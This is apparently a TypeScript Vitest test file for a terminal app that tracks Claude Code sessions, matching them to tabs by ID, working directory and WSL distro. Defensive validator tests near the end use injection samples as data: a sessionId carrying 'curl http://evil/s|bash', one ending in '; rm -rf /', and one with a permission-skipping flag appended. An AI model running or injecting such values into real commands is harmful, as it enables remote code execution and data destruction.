import { describe, it, expect, vi, beforeEach } from 'vitest';

vi.mock('@tauri-apps/api/core', () => ({
  invoke: vi.fn(),
}));

import { invoke } from '@tauri-apps/api/core';
import {
  agentStateFromStatus,
  isShellStatus,
  normalizeCwd,
  tabCwdForMatch,
  matchSessionsToTabs,
  nextAgentStateFromSession,
  collectWslDistros,
  type ClaudeSession,
  shouldPollWsl,
  isSessionId,
  SESSION_STALE_MS,
  sessionLastActiveAt,
  freshSessions,
  matchesHomeRelative,
  tabDistro,
  cwdMatches,
  adoptableTabIds,
  coveredTabIds,
  listClaudeSessions,
} from './claudeSessions';

describe('agentStateFromStatus', () => {
  it('1: waiting → blocked（応答待ち）', () => {
    expect(agentStateFromStatus('waiting')).toBe('blocked');
  });

  it('2: busy → working', () => {
    expect(agentStateFromStatus('busy')).toBe('working');
  });

  it('3: shell → working（コマンド実行中も「動いている」として統合する）', () => {
    expect(agentStateFromStatus('shell')).toBe('working');
  });

  it('4: idle → idle', () => {
    expect(agentStateFromStatus('idle')).toBe('idle');
  });

  it('5: 未知の値は undefined（画面判定へフォールバックさせる）', () => {
    expect(agentStateFromStatus('brand-new-status')).toBeUndefined();
    expect(agentStateFromStatus(undefined)).toBeUndefined();
  });

  it('6: done は status からは決まらない（Claude 側に存在しないため）', () => {
    const states = ['waiting', 'busy', 'shell', 'idle'].map(agentStateFromStatus);
    expect(states).not.toContain('done');
  });
});

describe('isShellStatus', () => {
  it('7: shell のときだけ true', () => {
    expect(isShellStatus('shell')).toBe(true);
    expect(isShellStatus('busy')).toBe(false);
    expect(isShellStatus(undefined)).toBe(false);
  });
});

describe('nextAgentStateFromSession', () => {
  it('26: working / blocked はそのまま反映される', () => {
    expect(nextAgentStateFromSession('idle', 'busy', false)).toBe('working');
    expect(nextAgentStateFromSession('working', 'waiting', false)).toBe('blocked');
    expect(nextAgentStateFromSession('idle', 'shell', false)).toBe('working');
  });

  it('27: working → idle の遷移は done になる（処理が完了した）', () => {
    expect(nextAgentStateFromSession('working', 'idle', false)).toBe('done');
  });

  it('28: done は idle が続いても維持される（見るまで消さない）', () => {
    expect(nextAgentStateFromSession('done', 'idle', false)).toBe('done');
  });

  it('29: アクティブタブでは done にせず idle にする', () => {
    expect(nextAgentStateFromSession('working', 'idle', true)).toBe('idle');
    expect(nextAgentStateFromSession('done', 'idle', true)).toBe('idle');
  });

  it('30: blocked → idle は done にしない（ダイアログのキャンセル等で誤検出しないため）', () => {
    expect(nextAgentStateFromSession('blocked', 'idle', false)).toBe('idle');
  });

  it('31: idle が続いても done にはならない', () => {
    expect(nextAgentStateFromSession('idle', 'idle', false)).toBe('idle');
    expect(nextAgentStateFromSession(undefined, 'idle', false)).toBe('idle');
  });

  it('32: 未知の status では前の状態を保つ（勝手に消さない）', () => {
    expect(nextAgentStateFromSession('working', 'brand-new', false)).toBe('working');
    expect(nextAgentStateFromSession('blocked', undefined, false)).toBe('blocked');
  });
});

describe('collectWslDistros', () => {
  it('33: -d の次の値を distro として集める', () => {
    const tabs = [
      { args: ['-d', 'Ubuntu-22.04', '--cd', '/home/me'] },
      { args: ['-d', 'Debian'] },
    ];
    expect(collectWslDistros(tabs).sort()).toEqual(['Debian', 'Ubuntu-22.04']);
  });

  it('34: 重複は 1 つにまとめる', () => {
    const tabs = [{ args: ['-d', 'Ubuntu-22.04'] }, { args: ['-d', 'Ubuntu-22.04'] }];
    expect(collectWslDistros(tabs)).toEqual(['Ubuntu-22.04']);
  });

  it('35: WSL タブが無ければ空（停止中の WSL を起こさないため重要）', () => {
    expect(collectWslDistros([{ args: ['-NoLogo'] }, {}])).toEqual([]);
  });

  it('36: -d が末尾で値が無いときは無視する', () => {
    expect(collectWslDistros([{ args: ['-d'] }])).toEqual([]);
  });
});

describe('normalizeCwd', () => {
  it('8: Windows パスは区切りを統一し小文字化する', () => {
    expect(normalizeCwd('C:\\Users\\Me\\Dev')).toBe('c:/users/me/dev');
  });

  it('9: Windows パスの大小差は同一視される', () => {
    expect(normalizeCwd('C:\\Users\\Me')).toBe(normalizeCwd('c:/users/me'));
  });

  it('10: Linux パスは大小を区別する（別ディレクトリを同一視しないため）', () => {
    expect(normalizeCwd('/home/me/Dev')).toBe('/home/me/Dev');
    expect(normalizeCwd('/home/me/Dev')).not.toBe(normalizeCwd('/home/me/dev'));
  });

  it('11: 末尾の区切りは落とす', () => {
    expect(normalizeCwd('/home/me/dev/')).toBe('/home/me/dev');
    expect(normalizeCwd('C:\\Users\\Me\\')).toBe('c:/users/me');
  });

  it('12: undefined / 空文字は null（照合対象から外す）', () => {
    expect(normalizeCwd(undefined)).toBeNull();
    expect(normalizeCwd('')).toBeNull();
    expect(normalizeCwd('   ')).toBeNull();
  });
});

describe('tabCwdForMatch', () => {
  it('13: WSL タブは --cd の Linux パスを優先する', () => {
    const tab = {
      id: 't1',
      cwd: 'C:\\Users\\me',
      args: ['-d', 'Ubuntu-22.04', '--cd', '/home/me/dev'],
    };
    expect(tabCwdForMatch(tab)).toBe('/home/me/dev');
  });

  it('14: --cd が ~ のときは解決できないので cwd に戻る', () => {
    const tab = { id: 't1', cwd: 'C:\\Users\\me', args: ['--cd', '~'] };
    expect(tabCwdForMatch(tab)).toBe('c:/users/me');
  });

  it('15: --cd が無ければ cwd を使う', () => {
    expect(tabCwdForMatch({ id: 't1', cwd: 'C:\\dev' })).toBe('c:/dev');
  });

  it('16: cwd も引数も無ければ null', () => {
    expect(tabCwdForMatch({ id: 't1' })).toBeNull();
  });
});

describe('matchSessionsToTabs', () => {
  const sessionA: ClaudeSession = {
    pid: 1,
    sessionId: 'sess-a',
    cwd: 'C:\\dev\\alpha',
    status: 'busy',
    startedAt: 100,
  };
  const sessionB: ClaudeSession = {
    pid: 2,
    sessionId: 'sess-b',
    cwd: 'C:\\dev\\beta',
    status: 'idle',
    startedAt: 200,
  };

  it('17: セッション ID が一致するタブへ結びつける', () => {
    const tabs = [{ id: 't1', claudeSessionId: 'sess-b' }];

    const m = matchSessionsToTabs([sessionA, sessionB], tabs);

    expect(m.get('t1')).toBe(sessionB);
  });

  it('18: ID 一致は cwd より優先される（同じ cwd でも取り違えない）', () => {
    // 2 タブとも cwd が同じだが、t2 は ID を持っている
    const tabs = [
      { id: 't1', cwd: 'C:\\dev\\alpha' },
      { id: 't2', cwd: 'C:\\dev\\alpha', claudeSessionId: 'sess-a' },
    ];

    const m = matchSessionsToTabs([sessionA], tabs);

    expect(m.get('t2')).toBe(sessionA);
    expect(m.has('t1')).toBe(false);
  });

  it('19: 手動起動タブ（ID なし）は cwd 一致で結びつける', () => {
    const tabs = [{ id: 't1', cwd: 'C:\\dev\\beta' }];

    const m = matchSessionsToTabs([sessionA, sessionB], tabs);

    expect(m.get('t1')).toBe(sessionB);
  });

  it('20: cwd の大小差があっても Windows パスなら結びつく', () => {
    const tabs = [{ id: 't1', cwd: 'c:/DEV/Alpha' }];

    const m = matchSessionsToTabs([sessionA], tabs);

    expect(m.get('t1')).toBe(sessionA);
  });

  it('21: 同じ cwd に複数タブがあるとき 1 セッションは 1 タブにだけ割り当てる', () => {
    const tabs = [
      { id: 't1', cwd: 'C:\\dev\\alpha' },
      { id: 't2', cwd: 'C:\\dev\\alpha' },
    ];

    const m = matchSessionsToTabs([sessionA], tabs);

    expect(m.size).toBe(1);
  });

  it('22: cwd を持たないセッションは割り当てない', () => {
    const noCwd: ClaudeSession = { pid: 9, sessionId: 'sess-x', status: 'busy' };
    const tabs = [{ id: 't1' }];

    expect(matchSessionsToTabs([noCwd], tabs).size).toBe(0);
  });

  it('23: WSL タブは --cd の Linux パスでセッションと結びつく', () => {
    const wslSession: ClaudeSession = {
      pid: 3,
      sessionId: 'sess-w',
      cwd: '/home/me/dev/app',
      status: 'waiting',
      distro: 'Ubuntu-22.04',
      startedAt: 300,
    };
    const tabs = [{ id: 't1', args: ['-d', 'Ubuntu-22.04', '--cd', '/home/me/dev/app'] }];

    const m = matchSessionsToTabs([wslSession], tabs);

    expect(m.get('t1')).toBe(wslSession);
  });

  it('24: 該当なしのときは空', () => {
    const tabs = [{ id: 't1', cwd: 'C:\\dev\\other' }];
    expect(matchSessionsToTabs([sessionA], tabs).size).toBe(0);
  });

  it('25: 開始が早いセッションから順に割り当てる', () => {
    // 同じ cwd に 2 セッション、タブも 2 つ。早い方が先に埋まる
    const older: ClaudeSession = { pid: 1, sessionId: 's-old', cwd: 'C:\\dev\\x', startedAt: 10 };
    const newer: ClaudeSession = { pid: 2, sessionId: 's-new', cwd: 'C:\\dev\\x', startedAt: 20 };
    const tabs = [
      { id: 't1', cwd: 'C:\\dev\\x' },
      { id: 't2', cwd: 'C:\\dev\\x' },
    ];

    const m = matchSessionsToTabs([newer, older], tabs);

    expect(m.get('t1')).toBe(older);
    expect(m.get('t2')).toBe(newer);
  });
});

describe('shouldPollWsl', () => {
  // WSL 側は `\wsl.localhost\` = 9P 越しで高く、停止した WSL を起こしてしまう。
  // 毎回触ると WSL が眠れないため、Windows 側より間引く。
  it('初回は必ず見に行く（起動直後の取りこぼしを避ける）', () => {
    expect(shouldPollWsl(0)).toBe(true);
  });

  it('間引かれた回は見に行かない', () => {
    expect(shouldPollWsl(1)).toBe(false);
    expect(shouldPollWsl(2)).toBe(false);
    expect(shouldPollWsl(3)).toBe(false);
    expect(shouldPollWsl(4)).toBe(false);
  });

  it('N 回に 1 回だけ見に行く', () => {
    expect(shouldPollWsl(5)).toBe(true);
    expect(shouldPollWsl(10)).toBe(true);
  });

  it('2 秒間隔なら WSL アクセスは 10 秒に 1 回になる', () => {
    const ticks = 30; // 60 秒ぶん
    const polls = Array.from({ length: ticks }, (_, i) => shouldPollWsl(i)).filter(Boolean).length;
    expect(polls).toBe(6); // 60 秒 / 10 秒
  });

  it('everyN=1 を渡せば毎回見に行く（間引きを無効化できる）', () => {
    expect(shouldPollWsl(1, 1)).toBe(true);
    expect(shouldPollWsl(2, 1)).toBe(true);
  });
});

describe('freshSessions', () => {
  // WSL では claude が強制終了するとセッションファイルが残る。実機に 2〜4 ヶ月前の
  // 死んだ json が 25 件あり、kind / entrypoint では 1 件も落とせない。
  // 時間だけが判別材料なので、この関数が機能全体の安全性を単独で支えている。
  const NOW = 1_000_000_000_000;

  it('37: updatedAt が新しいセッションは残る', () => {
    const live: ClaudeSession = { sessionId: 's', cwd: '/home/me', startedAt: 1, updatedAt: NOW - 1000 };
    expect(freshSessions([live], NOW)).toEqual([live]);
  });

  it('38: updatedAt が無くても startedAt で判定できる（古い形式のファイル向け）', () => {
    const started: ClaudeSession = { sessionId: 's', cwd: '/home/me', startedAt: NOW - 1000 };
    expect(freshSessions([started], NOW)).toEqual([started]);
  });

  it('39: updatedAt も startedAt も無いセッションは落とす（鮮度を判定できないため）', () => {
    const unknown: ClaudeSession = { sessionId: 's', cwd: '/home/me' };
    expect(freshSessions([unknown], NOW)).toEqual([]);
  });

  it('40: 3 日を超えた亡霊は落とす', () => {
    const ghost: ClaudeSession = { sessionId: 's', cwd: '/home/me', updatedAt: NOW - SESSION_STALE_MS - 1 };
    expect(freshSessions([ghost], NOW)).toEqual([]);
  });

  it('41: しきい値の境界（ちょうど 3 日）は残す', () => {
    const edge: ClaudeSession = { sessionId: 's', cwd: '/home/me', updatedAt: NOW - SESSION_STALE_MS };
    expect(freshSessions([edge], NOW)).toEqual([edge]);
  });

  it('42: updatedAt は startedAt より優先される（起動は古いが動き続けているセッション）', () => {
    const longRunning: ClaudeSession = {
      sessionId: 's',
      cwd: '/home/me',
      startedAt: NOW - SESSION_STALE_MS * 10,
      updatedAt: NOW - 1000,
    };
    expect(sessionLastActiveAt(longRunning)).toBe(NOW - 1000);
    expect(freshSessions([longRunning], NOW)).toEqual([longRunning]);
  });

  it('43: now より未来のセッションは落とさない（WSL ゲスト側のクロックずれで機能を殺さない）', () => {
    const future: ClaudeSession = { sessionId: 's', cwd: '/home/me', updatedAt: NOW + 60_000 };
    expect(freshSessions([future], NOW)).toEqual([future]);
  });

  it('44: maxAgeMs は差し替えられる（内部で Date.now() を呼ばない純関数）', () => {
    const s: ClaudeSession = { sessionId: 's', cwd: '/home/me', updatedAt: NOW - 5000 };
    expect(freshSessions([s], NOW, 1000)).toEqual([]);
    expect(freshSessions([s], NOW, 10_000)).toEqual([s]);
  });
});

describe('matchesHomeRelative', () => {
  // WSL お気に入りの既定引数が `--cd ~` なので、ここを解決できないと
  // WSL の既定お気に入りではセッションが一度も紐付かない。
  it('45: ~ は /home/<user> に一致する', () => {
    expect(matchesHomeRelative('~', '/home/me')).toBe(true);
  });

  it('46: ~ は /root にも一致する（root ユーザーの distro）', () => {
    expect(matchesHomeRelative('~', '/root')).toBe(true);
  });

  it('47: ~/dev/foo は /home/me/dev/foo に一致する', () => {
    expect(matchesHomeRelative('~/dev/foo', '/home/me/dev/foo')).toBe(true);
    expect(matchesHomeRelative('~/dev/foo', '/root/dev/foo')).toBe(true);
  });

  it('48: ~/dev/foo は /home/me/other/foo には一致しない', () => {
    expect(matchesHomeRelative('~/dev/foo', '/home/me/other/foo')).toBe(false);
  });

  it('49: ~ は /home/me/sub には一致しない（ホーム直下だけを指すため）', () => {
    expect(matchesHomeRelative('~', '/home/me/sub')).toBe(false);
  });

  it('50: 末尾のスラッシュ差は無視する', () => {
    expect(matchesHomeRelative('~/dev/foo', '/home/me/dev/foo/')).toBe(true);
  });

  it('51: ~ 始まりでなければ false（この関数は ~ 専用）', () => {
    expect(matchesHomeRelative('/home/me', '/home/me')).toBe(false);
  });

  it('52: ~other（別ユーザーのホーム）は解決しない', () => {
    expect(matchesHomeRelative('~other', '/home/other')).toBe(false);
  });

  it('53: ホームを逆算できないパス（カスタムホーム）は false（安全側に倒す）', () => {
    expect(matchesHomeRelative('~', '/mnt/data/me')).toBe(false);
    expect(matchesHomeRelative('~', 'C:\\Users\\me')).toBe(false);
  });
});

describe('tabDistro', () => {
  it('54: -d の値を distro として返す', () => {
    const tab = { id: 't1', shell: 'wsl.exe', args: ['-d', 'Ubuntu-22.04', '--cd', '~'] };
    expect(tabDistro(tab)).toBe('Ubuntu-22.04');
  });

  it('55: -d が無ければ undefined（既定 distro / Windows 側）', () => {
    expect(tabDistro({ id: 't1', shell: 'wsl.exe', args: ['--cd', '~'] })).toBeUndefined();
    expect(tabDistro({ id: 't2', cwd: 'C:\\dev' })).toBeUndefined();
  });
});

describe('cwdMatches', () => {
  it('56: distro が違えば同じ Linux パスでも一致しない（どの distro にも /home/me/dev はある）', () => {
    const tab = { id: 't1', shell: 'wsl.exe', args: ['-d', 'Debian', '--cd', '/home/me/dev'] };
    expect(cwdMatches(tab, { cwd: '/home/me/dev', distro: 'Ubuntu-22.04' })).toBe(false);
    expect(cwdMatches(tab, { cwd: '/home/me/dev', distro: 'Debian' })).toBe(true);
  });

  it('57: Windows 同士（distro が両方 undefined）は一致する', () => {
    expect(cwdMatches({ id: 't1', cwd: 'C:\\dev\\alpha' }, { cwd: 'C:\\dev\\Alpha' })).toBe(true);
  });

  it('58: WSL タブ（-d 無し）と Windows セッションは一致しない', () => {
    const tab = { id: 't1', shell: 'wsl.exe', cwd: 'C:\\dev\\alpha', args: ['--cd', '/home/me'] };
    expect(cwdMatches(tab, { cwd: 'C:\\dev\\alpha' })).toBe(false);
  });

  it('59: Windows タブと WSL セッションは一致しない', () => {
    const tab = { id: 't1', cwd: 'C:\\dev\\alpha' };
    expect(cwdMatches(tab, { cwd: 'C:\\dev\\alpha', distro: 'Ubuntu-22.04' })).toBe(false);
  });

  it('60: --cd ~ の WSL タブはホームを解決して一致する（既定お気に入りの疎通）', () => {
    const tab = {
      id: 't1',
      shell: 'wsl.exe',
      cwd: 'C:\\Users\\me',
      args: ['-d', 'Ubuntu-22.04', '--cd', '~'],
    };
    expect(cwdMatches(tab, { cwd: '/home/me', distro: 'Ubuntu-22.04' })).toBe(true);
    expect(cwdMatches(tab, { cwd: '/home/me/dev', distro: 'Ubuntu-22.04' })).toBe(false);
  });

  it('61: --cd ~ のタブは Windows 側の cwd へフォールバックしない（tabCwdForMatch との違い）', () => {
    // tabCwdForMatch は ~ を解決できないので cwd に戻るが、それを resume の根拠にすると
    // Linux で動いている claude を Windows のパスで一致させてしまう
    const tab = { id: 't1', shell: 'wsl.exe', cwd: 'C:\\Users\\me', args: ['--cd', '~'] };
    expect(tabCwdForMatch(tab)).toBe('c:/users/me');
    expect(cwdMatches(tab, { cwd: 'C:\\Users\\me' })).toBe(false);
  });

  it('62: cwd を持たないセッションとは一致しない', () => {
    expect(cwdMatches({ id: 't1', cwd: 'C:\\dev' }, {})).toBe(false);
  });
});

describe('adoptableTabIds', () => {
  const tabsOf = (...ids: string[]) => ids.map((id) => ({ id, cwd: 'C:\\dev\\x' }));
  const sessionAt = (sessionId: string, startedAt: number): ClaudeSession => ({
    sessionId,
    cwd: 'C:\\dev\\x',
    startedAt,
  });

  it('63: 同一 cwd にセッション 2 件・タブ 1 枚では採用しない（どちらの会話か決められない）', () => {
    const sessions = [sessionAt('s1', 10), sessionAt('s2', 20)];
    const tabs = tabsOf('t1');
    const matches = matchSessionsToTabs(sessions, tabs);

    expect(matches.has('t1')).toBe(true); // 表示は従来どおり付く
    expect(adoptableTabIds(sessions, tabs, matches).has('t1')).toBe(false);
  });

  it('64: セッション 1 件・タブ 2 枚でも採用しない（どのタブが動かしているか分からない）', () => {
    const sessions = [sessionAt('s1', 10)];
    const tabs = tabsOf('t1', 't2');
    const matches = matchSessionsToTabs(sessions, tabs);

    expect(adoptableTabIds(sessions, tabs, matches).size).toBe(0);
  });

  it('65: 厳密な 1 対 1 なら採用する', () => {
    const sessions = [sessionAt('s1', 10)];
    const tabs = tabsOf('t1');
    const matches = matchSessionsToTabs(sessions, tabs);

    expect([...adoptableTabIds(sessions, tabs, matches)]).toEqual(['t1']);
  });

  it('66: 別ディレクトリのセッションは 1 対 1 の判定に影響しない', () => {
    const other: ClaudeSession = { sessionId: 's2', cwd: 'C:\\dev\\other', startedAt: 20 };
    const sessions = [sessionAt('s1', 10), other];
    const tabs = tabsOf('t1');
    const matches = matchSessionsToTabs(sessions, tabs);

    expect(adoptableTabIds(sessions, tabs, matches).has('t1')).toBe(true);
  });

  it('67: ID 一致で結びついたタブ（racker 発番）は条件を問わず常に含む', () => {
    const sessions = [sessionAt('sess-a', 10), sessionAt('sess-b', 20)];
    const tabs = [{ id: 't1', cwd: 'C:\\dev\\x', claudeSessionId: 'sess-a' }];
    const matches = matchSessionsToTabs(sessions, tabs);

    // 同一 cwd にセッションが 2 件あっても、自分が発番した ID との一致は取り違えようがない
    expect(adoptableTabIds(sessions, tabs, matches).has('t1')).toBe(true);
  });

  it('68: ID 一致のタブと、そのセッションは他タブの 1 対 1 判定から除かれる', () => {
    const sessions = [sessionAt('sess-a', 10), sessionAt('s2', 20)];
    const tabs = [
      { id: 't1', cwd: 'C:\\dev\\x', claudeSessionId: 'sess-a' },
      { id: 't2', cwd: 'C:\\dev\\x' },
    ];
    const matches = matchSessionsToTabs(sessions, tabs);

    // t1 は ID で確定 → 残るのは s2 と t2 だけなので t2 も 1 対 1 が成立する
    expect([...adoptableTabIds(sessions, tabs, matches)].sort()).toEqual(['t1', 't2']);
  });

  it('69: racker 起動前から動いていたセッションでも、厳密な 1 対 1 なら採用する', () => {
    // 「別ターミナルで先に claude を動かしておき、後から同じフォルダで racker のタブを開く」
    // という使い方を潰さないため、セッションの開始時刻による条件は持たない
    const ancient = sessionAt('s-old', 1);
    const tabs = tabsOf('t1');
    const matches = matchSessionsToTabs([ancient], tabs);

    expect(adoptableTabIds([ancient], tabs, matches).has('t1')).toBe(true);
  });

  it('70: 照合できなかったタブは含まれない', () => {
    const sessions = [sessionAt('s1', 10)];
    const tabs = [
      { id: 't1', cwd: 'C:\\dev\\x' },
      { id: 't2', cwd: 'C:\\dev\\other' },
    ];
    const matches = matchSessionsToTabs(sessions, tabs);

    expect(adoptableTabIds(sessions, tabs, matches).has('t2')).toBe(false);
  });

  it('71: WSL タブは distro が一致するセッションとだけ 1 対 1 を数える', () => {
    const ubuntu: ClaudeSession = {
      sessionId: 's-u',
      cwd: '/home/me/dev',
      distro: 'Ubuntu-22.04',
      startedAt: 10,
    };
    const debian: ClaudeSession = {
      sessionId: 's-d',
      cwd: '/home/me/dev',
      distro: 'Debian',
      startedAt: 20,
    };
    const tabs = [
      { id: 't1', shell: 'wsl.exe', args: ['-d', 'Ubuntu-22.04', '--cd', '/home/me/dev'] },
    ];
    const matches = matchSessionsToTabs([ubuntu, debian], tabs);

    // 同じ Linux パスの別 distro セッションは候補に数えないので 1 対 1 が成立する
    expect(matches.get('t1')).toBe(ubuntu);
    expect(adoptableTabIds([ubuntu, debian], tabs, matches).has('t1')).toBe(true);
  });
});

describe('coveredTabIds', () => {
  const tabs = [
    { id: 'win', cwd: 'C:\\dev' },
    { id: 'wsl', shell: 'wsl.exe', args: ['-d', 'Ubuntu-22.04', '--cd', '~'] },
    { id: 'wsl-default', shell: 'wsl.exe', args: ['--cd', '~'] },
  ];

  it('72: 非 WSL タブは常に含まれる', () => {
    expect(coveredTabIds(tabs, []).has('win')).toBe(true);
    expect(coveredTabIds(tabs, ['Ubuntu-22.04']).has('win')).toBe(true);
  });

  it('73: WSL を間引いた tick では WSL タブが含まれない（誤って「消えた」と判断しないため）', () => {
    expect(coveredTabIds(tabs, []).has('wsl')).toBe(false);
  });

  it('74: 見に行った distro の WSL タブは含まれる', () => {
    expect(coveredTabIds(tabs, ['Ubuntu-22.04']).has('wsl')).toBe(true);
  });

  it('75: 別 distro しか見ていない tick では含まれない', () => {
    expect(coveredTabIds(tabs, ['Debian']).has('wsl')).toBe(false);
  });

  it('76: -d 無しの WSL タブは常に含まれない（distros に載せようがないため）', () => {
    expect(coveredTabIds(tabs, ['Ubuntu-22.04']).has('wsl-default')).toBe(false);
    expect(coveredTabIds(tabs, []).has('wsl-default')).toBe(false);
  });
});

describe('listClaudeSessions', () => {
  /** 実データと同じ UUID 形式。UUID でない ID は境界で捨てられる（isSessionId）。 */
  const SID = '3f359448-17ed-4b3c-add4-5d85007efc91';

  beforeEach(() => {
    vi.mocked(invoke).mockReset();
  });

  it('77: 成功して 0 件なら空配列を返す（claude を全部終了した状態）', async () => {
    vi.mocked(invoke).mockResolvedValue([]);
    await expect(listClaudeSessions([])).resolves.toEqual([]);
  });

  it('78: invoke が失敗したら null を返す（0 件と区別できるようにする）', async () => {
    vi.mocked(invoke).mockRejectedValue(new Error('boom'));
    await expect(listClaudeSessions([])).resolves.toBeNull();
  });

  it('79: 取得できたセッションはそのまま返す', async () => {
    const sessions: ClaudeSession[] = [{ sessionId: SID, cwd: 'C:\\dev' }];
    vi.mocked(invoke).mockResolvedValue(sessions);
    await expect(listClaudeSessions(['Ubuntu-22.04'])).resolves.toEqual(sessions);
    expect(vi.mocked(invoke)).toHaveBeenCalledWith('list_claude_sessions', {
      distros: ['Ubuntu-22.04'],
    });
  });

  // Rust 側は `Option<_>` を skip_serializing_if 無しで返すため、値が無い
  // フィールドは undefined ではなく null として届く。とくに Windows 側の
  // セッションは distro が必ず null になる。境界でここを寄せておかないと
  // `distro !== undefined` を通り抜けて `.length` で毎回落ちる。
  it('80: Rust から null で届いたフィールドは undefined に正規化する', async () => {
    vi.mocked(invoke).mockResolvedValue([
      { pid: 1, sessionId: SID, cwd: 'C:\\dev', status: 'idle', waitingFor: null,
        startedAt: 100, updatedAt: 200, name: null, version: null, distro: null },
    ]);

    const got = await listClaudeSessions([]);
    expect(got).not.toBeNull();
    expect(got?.[0].distro).toBeUndefined();
    expect(got?.[0].waitingFor).toBeUndefined();
    expect(got?.[0].name).toBeUndefined();
    // 値があるフィールドは素通しする
    expect(got?.[0].sessionId).toBe(SID);
    expect(got?.[0].updatedAt).toBe(200);
  });

  it('81: 正規化した Windows セッションは Windows タブと照合できる（distro null の回帰）', async () => {
    vi.mocked(invoke).mockResolvedValue([
      { sessionId: SID, cwd: 'C:\\dev', startedAt: 10, distro: null },
    ]);

    const sessions = await listClaudeSessions([]);
    const tabs = [{ id: 't1', cwd: 'C:\\dev', shell: 'nu' }];
    // 正規化前の値のままだと sessionDistroOf が null.length で TypeError になり、
    // Windows で claude を使っている限りポーリングが毎回落ちていた
    expect(matchSessionsToTabs(sessions ?? [], tabs).get('t1')?.sessionId).toBe(SID);
  });

  // sessionId は最終的に `claude --resume <id>` として引用符なしでシェルへ渡る。
  // 手動起動タブではこの値が外部ファイル (~/.claude/sessions/*.json) 由来になるため、
  // 境界で形を確かめないと「外部ファイルの文字列がシェルで評価される」経路になる。
  it('82: UUID の形をしていない sessionId は捨てる（シェルへ渡さない）', async () => {
    vi.mocked(invoke).mockResolvedValue([
      { sessionId: 'x; curl http://evil/s|bash', cwd: 'C:\\dev', startedAt: 10 },
    ]);

    const got = await listClaudeSessions([]);
    expect(got?.[0].sessionId).toBeUndefined();
    // 落とすのは ID だけ。状態表示に使う他のフィールドはそのまま残す
    expect(got?.[0].cwd).toBe('C:\\dev');
  });

  it('83: 空文字や途中までの UUID も捨てる', async () => {
    vi.mocked(invoke).mockResolvedValue([
      { sessionId: '', cwd: 'C:\\a' },
      { sessionId: '3f359448-17ed-4b3c-add4', cwd: 'C:\\b' },
      { sessionId: `${SID} --dangerously-skip-permissions`, cwd: 'C:\\c' },
    ]);

    const got = await listClaudeSessions([]);
    expect(got?.map((s) => s.sessionId)).toEqual([undefined, undefined, undefined]);
  });
});

describe('isSessionId', () => {
  it('84: UUID を受け入れ、それ以外を弾く', () => {
    expect(isSessionId('3f359448-17ed-4b3c-add4-5d85007efc91')).toBe(true);
    // 大文字も実在しうる形なので通す
    expect(isSessionId('3F359448-17ED-4B3C-ADD4-5D85007EFC91')).toBe(true);
    expect(isSessionId(undefined)).toBe(false);
    expect(isSessionId('')).toBe(false);
    expect(isSessionId('sess-1')).toBe(false);
    expect(isSessionId('3f359448_17ed_4b3c_add4_5d85007efc91')).toBe(false);
    // 前後に何か付いていたら弾く（コマンド連結を許さない）
    expect(isSessionId(' 3f359448-17ed-4b3c-add4-5d85007efc91')).toBe(false);
    expect(isSessionId('3f359448-17ed-4b3c-add4-5d85007efc91; rm -rf /')).toBe(false);
  });
});

describe('null 混入への耐性（正規化を通っていない値が来ても落ちない）', () => {
  // 永続化済みの古い値など、境界の正規化を通らない経路から null が来ても
  // 例外を投げないことを固定する。TS の型は null を許さないので cast で状況を作る。
  const nullish = (cwd: unknown, distro: unknown) =>
    ({ cwd, distro }) as Pick<ClaudeSession, 'cwd' | 'distro'>;

  it('82: distro が null のセッションは Windows 側として扱い、例外を投げない', () => {
    const tab = { id: 't1', cwd: 'C:\\dev', shell: 'nu' };
    expect(cwdMatches(tab, nullish('C:\\dev', null))).toBe(true);
  });

  it('83: cwd が null のセッションは一致しない（落ちずに false）', () => {
    const tab = { id: 't1', cwd: 'C:\\dev', shell: 'nu' };
    expect(cwdMatches(tab, nullish(null, null))).toBe(false);
  });
});
